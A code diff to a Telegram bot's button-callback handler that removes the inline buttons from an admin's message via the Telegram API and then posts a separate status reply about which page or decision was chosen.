@@ -109,10 +109,50 @@ bot.on("callback_query", async (query) => {
       console.log(`   Frontend should receive status: ${action === "page1" ? "accepted1" : action === "page2" ? "accepted2" : "rejected"}`);
       
       // ============================================================================
-      // 📝 SEND STATUS REPLY MESSAGE
+      // 📝 STEP 1: EDIT ORIGINAL MESSAGE - REMOVE BUTTONS
       // ============================================================================
       
-      console.log(`\n   📢 SENDING STATUS REPLY...`);
+      console.log(`\n   📝 STEP 1: REMOVING BUTTONS FROM ORIGINAL MESSAGE...`);
+      
+      try {
+        const botToken = process.env.BOT_TOKEN;
+        const chatId = process.env.ADMIN_CHAT_ID;
+        const messageId = query.message?.message_id;
+        const originalText = query.message?.text;
+        
+        if (!messageId || !originalText) {
+          console.error(`      ❌ No message ID or text found!`);
+          return;
+        }
+        
+        // Edit message to remove buttons (keep text only)
+        const editUrl = `https://api.telegram.org/bot${botToken}/editMessageText`;
+        const editResponse = await fetch(editUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            message_id: messageId,
+            text: originalText,
+            parse_mode: "HTML"
+            // No reply_markup = buttons removed!
+          })
+        });
+        
+        if (editResponse.ok) {
+          console.log(`      ✅ Buttons removed from original message!`);
+        } else {
+          console.error(`      ❌ Failed to edit message`);
+        }
+      } catch (err) {
+        console.error(`      ❌ Error editing message:`, err.message);
+      }
+      
+      // ============================================================================
+      // 📢 STEP 2: SEND SEPARATE STATUS REPLY MESSAGE
+      // ============================================================================
+      
+      console.log(`\n   📢 STEP 2: SENDING STATUS REPLY MESSAGE...`);
       
       let statusMessage = "";
       if (action === "page1") {
@@ -128,12 +168,7 @@ bot.on("callback_query", async (query) => {
         const chatId = process.env.ADMIN_CHAT_ID;
         const messageId = query.message?.message_id;
         
-        if (!messageId) {
-          console.error(`      ❌ No message ID found!`);
-          return;
-        }
-        
-        // Send reply to the original message
+        // Send as a reply to the original message
         const replyUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
         const replyResponse = await fetch(replyUrl, {
           method: "POST",
@@ -142,18 +177,18 @@ bot.on("callback_query", async (query) => {
             chat_id: chatId,
             text: statusMessage,
             parse_mode: "HTML",
-            reply_to_message_id: messageId  // Reply to original message
+            reply_to_message_id: messageId
           })
         });
         
         if (replyResponse.ok) {
-          console.log(`      ✅ Status reply sent successfully!`);
+          console.log(`      ✅ Status reply sent!`);
           console.log(`      Message: ${statusMessage}`);
         } else {
-          console.error(`      ❌ Failed to send status reply`);
+          console.error(`      ❌ Failed to send reply`);
         }
       } catch (err) {
-        console.error(`      ❌ Error sending status reply:`, err.message);
+        console.error(`      ❌ Error sending reply:`, err.message);
       }
     }
 
